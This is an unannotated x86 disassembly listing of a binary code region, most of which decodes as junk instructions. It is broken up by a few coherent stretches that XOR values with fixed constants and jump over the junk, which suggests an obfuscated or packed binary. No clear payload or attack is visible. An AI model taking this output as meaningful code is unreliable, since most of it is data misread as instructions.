  4150b0:	and    ebx,DWORD PTR ds:0xe33bd511
  4150b6:	clc    
  4150b7:	imul   ebp,eax,0x55
  4150ba:	add    DWORD PTR [edx+esi*8-0x8],0x2c
  4150bf:	jl     0x41513b
  4150c1:	in     al,dx
  4150c2:	and    eax,0xddd8f230
  4150c7:	jle    0x415129
  4150c9:	dec    edx
  4150ca:	mul    ch
  4150cc:	push   ecx
  4150cd:	xor    dh,0x5e
  4150d0:	pop    ds
  4150d1:	pop    ebx
  4150d2:	mov    ecx,0x8a96e8d8
  4150d7:	cwde   
  4150d8:	adc    eax,0x4058a8e1
  4150dd:	outs   dx,BYTE PTR ds:[esi]
  4150de:	xchg   DWORD PTR [ebp+ebp*2+0x7b],ebx
  4150e2:	and    eax,0x775851f4
  4150e7:	sub    esi,DWORD PTR [ecx-0x5f4f082b]
  4150ed:	mov    bh,0x8a
  4150ef:	out    0x49,al
  4150f1:	add    DWORD PTR gs:[edx-0x595ac996],esi
  4150f8:	pop    ebx
  4150f9:	fadd   QWORD PTR [ebp+0x38]
  4150fc:	pop    esi
  4150fd:	inc    DWORD PTR [edx-0x34]
  415100:	mov    al,ds:0x9d195fbc
  415105:	inc    edx
  415106:	pop    eax
  415107:	inc    edx
  415108:	cmp    BYTE PTR [eax+eiz*8-0x2b],bh
  41510c:	mov    cl,0xbd
  41510e:	fidiv  DWORD PTR [ebx]
  415110:	add    BYTE PTR [esp-0x1e],0x51
  415115:	gs call 0x4e34:0x8fb174fd
  41511d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41511e:	mov    edi,0x64fd5f62
  415123:	test   al,0x80
  415125:	or     esi,esp
  415127:	sbb    DWORD PTR ds:0x62e8354d,ebp
  41512d:	add    DWORD PTR [edi-0x18],edx
  415130:	pushf  
  415131:	dec    esi
  415132:	mov    BYTE PTR [ebp-0x29a10605],bh
  415138:	les    eax,FWORD PTR [ecx+0x13]
  41513b:	jno    0x4151ac
  41513d:	and    esi,DWORD PTR [ecx-0x48]
  415140:	shl    dl,1
  415142:	out    dx,eax
  415143:	dec    edx
  415144:	test   DWORD PTR [ecx-0x577fba98],esp
  41514a:	js     0x415143
  41514c:	push   cs
  41514d:	or     BYTE PTR [bx+si-0x4e],ch
  415151:	mov    es,WORD PTR [ebp+0x71]
  415154:	leave  
  415155:	mov    edx,esi
  415157:	jnp    0x415179
  415159:	nop
  41515a:	inc    ebp
  41515b:	xchg   ebp,eax
  41515c:	call   0x3cfe53be
  415161:	dec    esi
  415162:	jae    0x415116
  415164:	xchg   ebp,eax
  415165:	lds    esi,FWORD PTR [ebp-0x3]
  415168:	push   ds
  415169:	cmp    al,0x56
  41516b:	ins    DWORD PTR es:[edi],dx
  41516c:	xchg   edx,eax
  41516d:	or     DWORD PTR [ecx+0x74],0x59c76452
  415174:	adc    DWORD PTR [ebp+0x66],0x91c6d1f4
  41517b:	push   ecx
  41517c:	es jno 0x4151c4
  41517f:	sub    esp,eax
  415181:	mov    DWORD PTR [ebp-0x24],esp
  415184:	mov    eax,DWORD PTR [ebp-0x4]
  415187:	mov    ecx,0x7510855
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	fnstenv [eax]
  4151a5:	gs scas al,BYTE PTR es:[edi]
  4151a7:	cmp    ch,ch
  4151a9:	add    eax,0x7eb9707f
  4151ae:	jo     0x415220
  4151b0:	jp     0x4151bb
  4151b2:	js     0x41513a
  4151b4:	aad    0xe4
  4151b6:	les    ebx,FWORD PTR [edi-0x57ce9692]
  4151bc:	mov    bh,0x2
  4151be:	retf   0xbbfd
  4151c1:	stos   DWORD PTR es:[edi],eax
  4151c2:	call   0x1e0f4654
  4151c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151c8:	add    edi,ecx
  4151ca:	out    dx,eax
  4151cb:	sbb    al,0xf7
  4151cd:	or     dl,BYTE PTR [esi-0x33bd7b5f]
  4151d3:	scas   eax,DWORD PTR es:[edi]
  4151d4:	add    DWORD PTR [ebx-0x15],eax
  4151d7:	pop    ebx
  4151d8:	xor    DWORD PTR [eax+ecx*8+0x7a],edi
  4151dc:	ds loopne 0x415186
  4151df:	pushf  
  4151e0:	or     BYTE PTR [edx+0x18],bh
  4151e3:	jo     0x4151d0
  4151e5:	retf   
  4151e6:	jge    0x41517d
  4151e8:	sbb    al,0x44
  4151ea:	fiadd  DWORD PTR [ebx+0x12]
  4151ed:	sub    eax,0x6efa5449
  4151f2:	rol    BYTE PTR [ebp-0x45],0x85
  4151f6:	add    DWORD PTR [edi-0x70],ebp
  4151f9:	mov    al,BYTE PTR [eax+0x6455a447]
  4151ff:	xor    al,0x8c
  415201:	xchg   ebp,eax
  415202:	dec    esp
  415203:	push   ebx
  415204:	jg     0x4151ed
  415206:	xor    esi,DWORD PTR [esi-0x122759ca]
  41520c:	shl    BYTE PTR ds:0xffd8014f,0x26
  415213:	mov    dl,0x4
  415215:	mov    esi,0xc46940cc
  41521a:	pop    eax
  41521b:	xor    BYTE PTR [edx+ebp*4],dl
  41521e:	or     DWORD PTR [esi-0xa],0x4a
  415222:	jle    0x415205
  415224:	nop
  415225:	repz sub al,0xcb
  415228:	adc    eax,DWORD PTR [eax]
  41522a:	jo     0x41525c
  41522c:	jbe    0x415202
  41522e:	in     al,dx
  41522f:	test   eax,0x94d3cae2
  415234:	adc    al,0xc1
  415236:	das    
  415237:	jp     0x41526e
  415239:	pusha  
  41523a:	mov    dl,0x73
  41523c:	out    dx,al
  41523d:	push   ecx
  41523e:	scas   al,BYTE PTR es:[edi]
  41523f:	xchg   ecx,eax
  415240:	sar    eax,cl
  415242:	jmp    0xdbd:0xba848d59
  415249:	addr16 cli 
  41524b:	ret    0xdae7
  41524e:	cmp    eax,0xa1c6d0c1
  415253:	test   al,0xe8
  415255:	fdiv   QWORD PTR [eax-0x7dfd9765]
  41525b:	fsubr  st(6),st
  41525d:	icebp  
  41525e:	es das 
  415260:	jno    0x4151f2
  415262:	adc    eax,0x7dcd5c14
  415267:	or     al,cl
  415269:	xchg   esp,eax
  41526a:	or     al,0x93
  41526c:	inc    esp
  41526d:	mov    edi,0xcbff336a
  415272:	ficomp WORD PTR [esi+0x4]
  415275:	add    ah,dh
  415277:	xchg   esi,eax
  415278:	mov    es:0x28bf85a7,eax
  41527e:	sub    al,0xa1
  415280:	mov    cl,0x4c
  415282:	call   0x86969024
  415287:	and    ebx,esi
  415289:	out    0x5c,al
  41528b:	call   0xf88e:0x9b3c07ca
  415292:	int    0x47
  415294:	adc    cl,BYTE PTR [esi]
  415296:	mov    ebp,0x55dcb032
  41529b:	outs   dx,BYTE PTR ds:[esi]
  41529c:	fimul  DWORD PTR [eax]
  41529e:	xchg   esi,eax
  41529f:	xor    esp,ebx
  4152a1:	call   0x4767f457
  4152a6:	mov    WORD PTR [edx+0x3f],ds
  4152a9:	stc    
  4152aa:	aas    
  4152ab:	in     al,0x50
  4152ad:	loopne 0x4152d8
  4152af:	pushf  
  4152b0:	fnstcw WORD PTR [eax-0x67]
  4152b3:	xor    eax,0x3a810dbb
  4152b8:	pop    ebx
  4152b9:	js     0x4152ad
  4152bb:	fwait
  4152bc:	and    edx,ebx
  4152be:	out    dx,eax
  4152bf:	inc    ebp
  4152c0:	adc    al,0x6f
  4152c2:	aad    0x1f
  4152c4:	loopne 0x4152aa
  4152c6:	sbb    edi,DWORD PTR [ebx-0x20cbd9dc]
  4152cc:	adc    DWORD PTR [edi],esi
  4152ce:	adc    eax,0x5857ad4e
  4152d4:	mov    ds:0x2586a22e,eax
  4152d9:	pop    es
  4152da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152db:	adc    BYTE PTR [edi+ebx*4],0x60
  4152df:	cmp    ebx,DWORD PTR [ecx-0x758ccf91]
  4152e5:	stc    
  4152e6:	je     0x415346
  4152e8:	mov    ecx,0x7c83875d
  4152ed:	dec    esp
  4152ee:	(bad)  
  4152ef:	xor    ebx,esi
  4152f1:	mov    bl,BYTE PTR [ecx+0x1a]
  4152f4:	ja     0x415286
  4152f6:	je     0x41536e
  4152f8:	pop    ds
  4152f9:	ins    BYTE PTR es:[edi],dx
  4152fa:	clc    
  4152fb:	in     al,0xcf
  4152fd:	push   ebx
  4152fe:	dec    edx
  4152ff:	iret   
  415300:	stc    
  415301:	pop    edx
  415302:	int    0xf2
  415304:	or     BYTE PTR [ebp-0x332b6ab],0x68
  41530b:	cmp    cl,BYTE PTR [edx+eax*1+0x5a]
  41530f:	pop    esi
  415310:	out    0x45,eax
  415312:	xchg   ecx,eax
  415313:	jecxz  0x41536e
  415315:	stos   DWORD PTR es:[edi],eax
  415316:	cs mov esi,ebp
  415319:	in     eax,0x7c
  41531b:	mov    WORD PTR [edi+0x10],?
  41531e:	xchg   esi,eax
  41531f:	ss inc ebp
  415321:	push   ecx
  415322:	js     0x41530d
  415324:	jo     0x41532d
  415326:	push   edx
  415327:	sbb    eax,0xa9728be5
  41532c:	loop   0x4152e3
  41532e:	into   
  41532f:	push   ebx
  415330:	or     BYTE PTR [edi],bh
  415332:	das    
  415333:	push   cs
  415334:	scas   eax,DWORD PTR es:[edi]
  415335:	mov    ah,0xad
  415337:	bound  esi,QWORD PTR [edx+0x5b195520]
  41533d:	das    
  41533e:	push   ds
  41533f:	ins    DWORD PTR es:[edi],dx
  415340:	outs   dx,DWORD PTR ds:[esi]
  415341:	xchg   al,dh
  415343:	jbe    0x415355
  415345:	cli    
  415346:	dec    ebp
  415347:	outs   dx,DWORD PTR ds:[esi]
  415348:	add    DWORD PTR [esi],esp
  41534a:	mov    eax,0xeb84f89e
  41534f:	js     0x4152de
  415351:	adc    eax,0xae60b236
  415356:	shl    bh,1
  415358:	inc    ebx
  415359:	and    al,0xf
  41535b:	push   cs
  41535c:	cs es cld 
  41535f:	ficom  DWORD PTR [edi+0x59]
  415362:	cld    
  415363:	rol    esi,0x7f
  415366:	add    al,0x92
  415368:	dec    ebp
  415369:	and    eax,0xe73ae688
  41536e:	in     eax,0x59
  415370:	fnstcw WORD PTR [ebx+edx*1-0x742ea35]
  415377:	fisttp QWORD PTR [eax+0xe99af1e]
  41537d:	out    dx,al
  41537e:	mov    BYTE PTR [eax-0x7d5f9564],dl
  415384:	sbb    eax,0xf12f70e0
  415389:	sbb    eax,0x18090851
  41538e:	rcl    DWORD PTR [edi],0x40
  415391:	ins    DWORD PTR es:[edi],dx
  415392:	add    edx,DWORD PTR [ecx]
  415394:	mov    dl,0x5e
  415396:	jnp    0x4153a7
  415398:	ret    
  415399:	je     0x41535d
  41539b:	dec    edi
  41539c:	iret   
  41539d:	mov    ebx,0xe6534bb7
  4153a2:	les    ebp,FWORD PTR [edi*4+0x13d00f37]
  4153a9:	bound  ecx,QWORD PTR [esp+ebp*4]
  4153ac:	test   al,0xf6
  4153ae:	sar    BYTE PTR [edx+edi*4],0xd0
  4153b2:	enter  0xb03f,0x5f
  4153b6:	pop    ds
  4153b7:	xchg   ebp,eax
  4153b8:	pop    ss
  4153b9:	dec    BYTE PTR [ebx+0x44]
  4153bc:	cmp    BYTE PTR [esp+ebp*4-0x63bfd58e],dl
  4153c3:	in     al,0x5e
  4153c5:	sbb    eax,DWORD PTR [edx+0x22e16f86]
  4153cb:	fsubr  st(1),st
  4153cd:	and    bl,BYTE PTR ds:0x44817788
  4153d3:	lods   al,BYTE PTR ds:[esi]
  4153d4:	addr16 inc esi
  4153d6:	pop    edi
  4153d7:	xor    BYTE PTR [esi],ch
  4153d9:	push   ss
  4153da:	(bad)  
  4153db:	sbb    DWORD PTR [ebp+0x34],ebp
  4153de:	sbb    ah,BYTE PTR [edx-0x42508575]
  4153e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153e5:	popf   
  4153e6:	mov    WORD PTR [ecx-0x357072f2],?
  4153ec:	cmp    DWORD PTR [ebx-0x2d61285a],esp
  4153f2:	(bad)
  4153f5:	imul   eax,ebx,0x60bbc7dc
  4153fb:	and    DWORD PTR [esi],0x5d
  4153fe:	cmp    dl,BYTE PTR [esi]
  415400:	xlat   BYTE PTR ds:[ebx]
  415401:	test   eax,0xfa98a67
  415406:	sub    ch,BYTE PTR [ebp+0x73]
  415409:	xchg   esi,eax
  41540a:	mov    ch,0xe9
  41540c:	(bad)  
  41540d:	fldenv [edi]
  41540f:	mov    ch,0x28
  415411:	out    dx,al
  415412:	mov    BYTE PTR [eax+0x2],ch
  415415:	cli    
  415416:	mov    ds:0x74967e0d,eax
  41541b:	out    0x0,eax
  41541d:	add    al,0x16
  41541f:	mov    al,0x62
  415421:	sbb    eax,0xc900c47f
  415426:	repz in al,dx
  415428:	and    eax,0xe6a6162b
  41542d:	es ret 0x36d1
  415431:	push   ebx
  415432:	fstp   QWORD PTR [ebp+0x1b7300f6]
  415438:	pop    esi
  415439:	xchg   esi,eax
  41543a:	popa   
  41543b:	fsub   st(4),st
  41543d:	jl     0x415472
  41543f:	nop
  415440:	pop    ebp
  415441:	jae    0x415430
  415443:	ret    
  415444:	sub    eax,0xa97522b3
  415449:	into   
  41544a:	lahf   
  41544b:	popa   
  41544c:	aad    0xfd
  41544e:	fisubr WORD PTR [esi]
  415450:	cs push edi
  415452:	retfw  0x56f8
  415456:	xchg   DWORD PTR [eiz*4-0x29a76d5c],esi
  41545d:	ficomp DWORD PTR [ecx+0x60]
  415460:	cwde   
  415461:	dec    esp
  415462:	cmp    ebp,DWORD PTR [edx+ecx*1+0x44b2e339]
  415469:	push   ebp
  41546a:	mov    ch,0x9f
  41546c:	or     eax,0x1108f472
  415471:	xchg   edi,ebp
  415473:	sbb    al,0xc2
  415475:	retf   
  415476:	clc    
  415477:	add    eax,edx
  415479:	mov    DWORD PTR [ebp+0x8],eax
  41547c:	mov    eax,DWORD PTR [ebp-0x18]
  41547f:	xor    eax,ecx
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0x55
  4154c8:	xlat   BYTE PTR ds:[ebx]
  4154c9:	fstp   TBYTE PTR [edx+0x707f0236]
  4154cf:	mov    ecx,0xad70707e
  4154d4:	mov    esp,0x3ef61aac
  4154d9:	dec    ebx
  4154da:	shl    bh,0x64
  4154dd:	jnp    0x41549f
  4154df:	pop    ecx
  4154e0:	push   ebp
  4154e1:	lds    eax,FWORD PTR [esp+ebx*1+0x18]
  4154e5:	push   es
  4154e6:	rcr    BYTE PTR [eax],1
  4154e8:	and    BYTE PTR ds:0x77d6bda2,cl
  4154ee:	mov    ds:0xf29fe376,al
  4154f3:	push   ss
  4154f4:	or     al,dh
  4154f6:	mov    BYTE PTR [edi-0x77b9f4b3],ch
  4154fc:	dec    edi
  4154fd:	je     0x4154cf
  4154ff:	repz cmp al,0x1
  415502:	data16 aam 0x5d
  415505:	jbe    0x415506
  415507:	push   ds
  415508:	jnp    0x41554e
  41550a:	xor    esp,DWORD PTR [ecx+0x7553aa14]
  415510:	popa   
  415511:	dec    ebp
  415512:	nop
  415513:	dec    ebp
  415514:	call   FWORD PTR [ebx-0x43]
  415517:	enter  0x5e8d,0x99
  41551b:	cmp    edx,DWORD PTR [edi-0x69]
  41551e:	ds scas al,BYTE PTR es:[edi]
  415520:	pop    ecx
  415521:	mov    al,0xb0
  415523:	aaa    
  415524:	fimul  WORD PTR [ebx-0x6f]
  415527:	mov    WORD PTR ds:0xebc2a9b4,es
  41552d:	in     eax,dx
  41552e:	adc    eax,0x832d87ba
  415533:	into   
  415534:	(bad)  
  415535:	and    BYTE PTR [ebp-0x13],bl
  415538:	outs   dx,DWORD PTR ds:[esi]
  415539:	xchg   ebx,eax
  41553a:	je     0x4154fe
  41553c:	dec    ebp
  41553d:	dec    ebp
  41553e:	xchg   edx,eax
  41553f:	mov    ecx,0x7d9ec40f
  415544:	dec    ebx
  415545:	(bad)  
  415546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415547:	sbb    bh,bh
  415549:	jo     0x41551a
  41554b:	call   0x694:0x8534b1a5
  415552:	scas   al,BYTE PTR es:[edi]
  415553:	sbb    dh,BYTE PTR [ebp-0x3a6c5299]
  415559:	mov    bh,0xcf
  41555b:	mov    ds:0xecb976d8,eax
  415560:	jg     0x4154ec
  415562:	push   ss
  415563:	out    dx,al
  415564:	lds    edi,FWORD PTR [edi+0x768074ff]
  41556a:	fdiv   QWORD PTR [edi-0x24]
  41556d:	pop    ebx
  41556e:	mov    DWORD PTR [ecx-0x4b],esp
  415571:	mov    al,ch
  415573:	pop    ss
  415574:	xor    al,0x85
  415576:	push   ds
  415577:	push   0x47fbcc43
  41557c:	shr    BYTE PTR [esi+0x20],cl
  41557f:	and    ch,BYTE PTR [esi]
  415581:	adc    BYTE PTR [ecx-0x30b04178],bl
  415587:	scas   al,BYTE PTR es:[edi]
  415588:	inc    edx
  415589:	xadd   DWORD PTR [edi-0x6b],ebp
  41558d:	loopne 0x4155d9
  41558f:	xlat   BYTE PTR fs:[ebx]
  415591:	add    dl,BYTE PTR [eax+0xebd8c91]
  415597:	call   0x949f2d2d
  41559c:	arpl   WORD PTR [ebp-0xf],cx
  41559f:	aaa    
  4155a0:	inc    ecx
  4155a1:	pop    eax
  4155a2:	push   ebp
  4155a3:	test   edx,esp
  4155a5:	mov    ch,0xb4
  4155a7:	pop    edi
  4155a8:	jne    0x415544
  4155aa:	jge    0x4155bf
  4155ac:	mov    ds:0x49f301e8,al
  4155b1:	loop   0x4155d4
  4155b3:	sar    DWORD PTR [ebx],cl
  4155b5:	sar    dh,1
  4155b7:	(bad)  
  4155b8:	loopne 0x415607
  4155ba:	jmp    0x81ce:0x69d9fcbb
  4155c1:	mov    eax,ds:0x8d28cc31
  4155c6:	xor    DWORD PTR [esi],0xd4dab9ca
  4155cc:	loop   0x4155ed
  4155ce:	test   DWORD PTR [esi+0xb],esp
  4155d1:	out    dx,eax
  4155d2:	clc    
  4155d3:	mov    BYTE PTR [eax-0x30d7f47c],al
  4155d9:	add    ebp,ebp
  4155db:	lahf   
  4155dc:	in     al,0x4a
  4155de:	fistp  WORD PTR [ebp-0x2b]
  4155e1:	outs   dx,DWORD PTR ds:[esi]
  4155e2:	mov    bl,0xa6
  4155e4:	jp     0x4155b4
  4155e6:	js     0x41557e
  4155e8:	sbb    esi,DWORD PTR [esi-0x590ec5b9]
  4155ee:	sahf   
  4155ef:	adc    ebp,DWORD PTR [esi-0x7eb01b92]
  4155f5:	call   0xc20e:0xdbb59a38
  4155fc:	push   edx
  4155fd:	jno    0x4155f4
  4155ff:	ret    0xde6b
  415602:	ds lock (bad) 
  415605:	sub    ebp,DWORD PTR [esi+0xfab67a4]
  41560b:	jl     0x41566f
  41560d:	mov    al,0xfc
  41560f:	scas   al,BYTE PTR es:[edi]
  415610:	push   edi
  415611:	cld    
  415612:	adc    ebx,DWORD PTR [ebp+0x1a]
  415615:	ret    
  415616:	xchg   esi,eax
  415617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415618:	mov    bl,0xcf
  41561a:	cmp    eax,0xfa14a5ea
  41561f:	fsubr  st(6),st
  415621:	lock sub BYTE PTR [ebx],dl
  415624:	and    eax,0x421769e0
  415629:	xor    eax,0x457d6aee
  41562e:	mov    BYTE PTR [edi-0x35],ah
  415631:	push   edx
  415632:	add    ah,BYTE PTR [edx+ecx*2]
  415635:	mov    esp,0xd70f82b0
  41563a:	ret    
  41563b:	sub    al,0xa
  41563d:	loopne 0x4155e5
  41563f:	cmc    
  415640:	xor    cl,dh
  415642:	inc    eax
  415643:	push   ebp
  415644:	inc    esp
  415645:	pusha  
  415646:	aam    0xea
  415648:	or     ebp,esp
  41564a:	(bad)  
  41564b:	int    0x2b
  41564d:	jl     0x4156bc
  41564f:	sbb    eax,0x1c13e503
  415654:	push   esp
  415655:	fmul   DWORD PTR [ebx+0x40]
  415658:	and    DWORD PTR [eax-0xb],esp
  41565b:	mov    ebp,0xc346c14
  415660:	jne    0x41567b
  415662:	cdq    
  415663:	out    dx,al
  415664:	xchg   esi,eax
  415665:	xor    DWORD PTR [edi],0xffffff9e
  415668:	mov    ds:0x246bbd9f,eax
  41566d:	mov    DWORD PTR [ebx+ecx*1],edi
  415670:	mov    ds:0xaa8b3f48,al
  415675:	jo     0x415679
  415677:	(bad)  
  415678:	pop    edx
  415679:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41567a:	mov    dh,0x62
  41567c:	mov    esp,0xc5b588d7
  415681:	adc    BYTE PTR [ecx+0x33],dl
  415684:	fimul  DWORD PTR [edx-0x8]
  415687:	outs   dx,DWORD PTR ds:[esi]
  415688:	push   0xffffff99
  41568a:	mov    ds:0xb758448b,eax
  41568f:	sub    BYTE PTR [edx+0x22],0x48
  415693:	inc    ebx
  415694:	sbb    BYTE PTR [eax+0x462f1433],bh
  41569a:	fistp  DWORD PTR [edx+0x515cbd54]
  4156a0:	xor    esp,DWORD PTR [esi]
  4156a2:	lsl    ecx,WORD PTR ds:0xbd754a5c
  4156a9:	push   edi
  4156aa:	cld    
  4156ab:	out    dx,al
  4156ac:	cli    
  4156ad:	xor    DWORD PTR [esi-0x1458a00c],eax
  4156b3:	lea    ebx,[ebx-0x7fdb80f]
  4156b9:	das    
  4156ba:	add    al,0xf6
  4156bc:	jge    0x41565a
  4156be:	xchg   edx,eax
  4156bf:	jmp    0x7870:0x4e8dbe46
  4156c6:	lahf   
  4156c7:	ficom  WORD PTR [ebp-0x4321261d]
  4156cd:	fnstsw WORD PTR [edx-0x6bb1bd6c]
  4156d3:	add    ecx,0x882c83c7
  4156d9:	lea    ecx,[ebp+ebx*4+0x3de24c98]
  4156e0:	das    
  4156e1:	fucom  st(1)
  4156e3:	sbb    BYTE PTR [edx-0x607c4273],bl
  4156e9:	adc    al,0x40
  4156eb:	mov    al,0xae
  4156ed:	pop    ebx
  4156ee:	and    al,bh
  4156f0:	sbb    eax,0xeb0df0d4
  4156f5:	fwait
  4156f6:	add    eax,0xc8c585d8
  4156fb:	(bad)  [ebx+esi*8]
  4156fe:	les    esi,FWORD PTR [ebx+0x7bfe705f]
  415704:	loop   0x4156e1
  415706:	and    eax,0xd03ffcc5
  41570b:	or     al,0xf1
  41570d:	enter  0x29bd,0x80
  415711:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415712:	inc    edi
  415713:	push   ebp
  415714:	call   0xa2dc66ab
  415719:	inc    ecx
  41571a:	pop    esi
  41571b:	inc    ebp
  41571c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41571d:	pop    edi
  41571e:	sbb    bh,BYTE PTR [eax-0x62639d90]
  415724:	pop    eax
  415725:	jecxz  0x415724
  415727:	cmp    edi,DWORD PTR [esi-0x3ad6ba0f]
  41572d:	mov    dh,0xa9
  41572f:	sbb    BYTE PTR [edi],bl
  415731:	mov    esp,0x8c9ab245
  415736:	push   ss
  415737:	push   cs
  415738:	cmp    al,0x7b
  41573a:	out    dx,eax
  41573b:	sti    
  41573c:	jmp    0x98c2dee
  415741:	nop
  415742:	rcr    DWORD PTR [edx],1
  415744:	push   0xfd334561
  415749:	add    edi,ebp
  41574b:	or     al,0x94
  41574d:	(bad)  
  41574f:	xor    al,0x2b
  415751:	sahf   
  415752:	jnp    0x4156f8
  415754:	adc    esp,DWORD PTR [ecx]
  415756:	in     al,0x3e
  415758:	(bad)  
  415759:	fsub   DWORD PTR [ebx]
  41575b:	sub    eax,0xcd2283b8
  415760:	add    bl,BYTE PTR [edx]
  415762:	fidiv  WORD PTR [eax+eax*1-0x67]
  415766:	cmp    edx,DWORD PTR [ebp-0x2d]
  415769:	ficomp WORD PTR [ecx]
  41576b:	adc    DWORD PTR [ecx-0x3b],ebx
  41576e:	or     edi,DWORD PTR [ecx+0x25]
  415771:	cmp    bl,BYTE PTR [edx+0x4f]
  415774:	sbb    ah,BYTE PTR [ecx-0x45]
  415777:	sbb    DWORD PTR ds:0xac81b149,esp
  41577d:	adc    al,0x37
  41577f:	bound  ebp,QWORD PTR [eax]
  415781:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415782:	adc    ch,BYTE PTR ds:0x27b9a925
  415788:	mov    ds:0x3998751a,al
  41578d:	ins    BYTE PTR es:[edi],dx
  41578e:	push   cs
  41578f:	cmp    ebx,edx
  415791:	inc    edx
  415792:	mov    ch,0x20
  415794:	cli    
  415795:	ret    
  415796:	sbb    ebp,edi
  415798:	in     eax,0x54
  41579a:	mov    esi,0x32729c
  41579f:	add    edi,esi
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   bl,al
  4157b8:	pop    ebx
  4157b9:	mov    bh,0x2e
  4157bb:	jg     0x4157cc
  4157bd:	jg     0x41582f
  4157bf:	mov    ecx,0xd70707e
  4157c4:	adc    al,0x67
  4157c6:	mov    eax,ds:0x38d0425d
  4157cb:	fist   WORD PTR [eax-0x4f]
  4157ce:	dec    BYTE PTR [ebp-0x7d031faf]
  4157d4:	popf   
  4157d5:	jle    0x415839
  4157d7:	icebp  
  4157d8:	scas   al,BYTE PTR es:[edi]
  4157d9:	or     eax,0x2fc78beb
  4157de:	cld    
  4157df:	neg    BYTE PTR [eax-0x6931a81f]
  4157e5:	and    BYTE PTR [edx-0x262b9508],al
  4157eb:	mov    ah,0xdb
  4157ed:	mov    esp,0xbc9032dd
  4157f2:	cmc    
  4157f3:	mov    cl,0x5e
  4157f5:	repz jle 0x4157e4
  4157f8:	test   eax,0x8c6635f7
  4157fd:	ds pop esi
  4157ff:	mov    BYTE PTR [eax+0x3233b1aa],bh
  415805:	push   esi
  415806:	out    dx,al
  415807:	repz cdq 
  415809:	push   es
  41580a:	mov    cl,0x60
  41580c:	dec    edi
  41580d:	lods   al,BYTE PTR ds:[esi]
  41580f:	lods   al,BYTE PTR ds:[esi]
  415810:	sub    ah,BYTE PTR [edi]
  415812:	nop
  415813:	adc    eax,0x64781b94
  415818:	mov    dh,0xc2
  41581a:	pop    ebp
  41581b:	push   edi
  41581c:	inc    esi
  41581d:	xchg   ebx,eax
  41581e:	hlt    
  41581f:	stos   BYTE PTR es:[edi],al
  415820:	jmp    0xbe3c:0x7b329948
  415827:	push   edi
  415828:	cld    
  415829:	add    BYTE PTR [esi],dh
  41582b:	ret    
  41582c:	xchg   ebp,eax
  41582d:	cmc    
  41582e:	pop    ss
  41582f:	leave  
  415830:	out    0x43,al
  415832:	(bad)
  415836:	or     al,0x5f
  415838:	sti    
  415839:	in     eax,dx
  41583a:	jecxz  0x41586e
  41583c:	dec    ebp
  41583d:	dec    edx
  41583e:	cmp    al,BYTE PTR [ecx-0x44]
  415841:	call   0xc22d681c
  415846:	adc    bh,BYTE PTR [bx+si]
  415849:	jno    0x415837
  41584b:	addr16 cmc 
  41584d:	xchg   edi,eax
  41584e:	cli    
  41584f:	in     eax,dx
  415850:	jg     0x4158c0
  415852:	push   es
  415853:	popf   
  415854:	loop   0x41589a
  415856:	jg     0x4158c4
  415858:	mov    ecx,0x21ddcd2e
  41585d:	xor    DWORD PTR [ebx+ecx*1],edx
  415860:	mov    ch,0xa9
  415862:	mov    ?,WORD PTR [ecx-0x6a908baf]
  415868:	jns    0x6fc97aa3
  41586e:	xchg   edi,eax
  41586f:	lock jge 0x415806
  415872:	lahf   
  415873:	cli    
  415874:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415875:	outs   dx,DWORD PTR ds:[esi]
  415876:	leave  
  415877:	lods   al,BYTE PTR ds:[esi]
  415878:	rcl    DWORD PTR [ecx],cl
  41587a:	iret   
  41587b:	cmp    edi,esi
  41587d:	jl     0x4158fa
  41587f:	mov    ebp,0x7bf504a1
  415884:	call   0xbf30698d
  415889:	enter  0x2f7e,0xf6
  41588d:	inc    ebx
  41588e:	mov    bh,0xfe
  415890:	or     ebp,DWORD PTR [eax-0x4e]
  415893:	and    DWORD PTR [esi-0x4b],edi
  415896:	xchg   edx,eax
  415897:	cmp    eax,0xfb9f200e
  41589c:	push   ebx
  41589d:	or     DWORD PTR ds:0x46ca0c8c,edi
  4158a3:	das    
  4158a4:	loopne 0x41585b
  4158a6:	cdq    
  4158a7:	stc    
  4158a8:	mov    edi,cs
  4158aa:	lock push ecx
  4158ac:	(bad)  
  4158ad:	pushw  0x12
  4158b0:	jmp    0xb665bd56
  4158b5:	xor    eax,0x1ba03791
  4158ba:	jno    0x415850
  4158bc:	xchg   edi,eax
  4158bd:	push   ecx
  4158be:	pop    edi
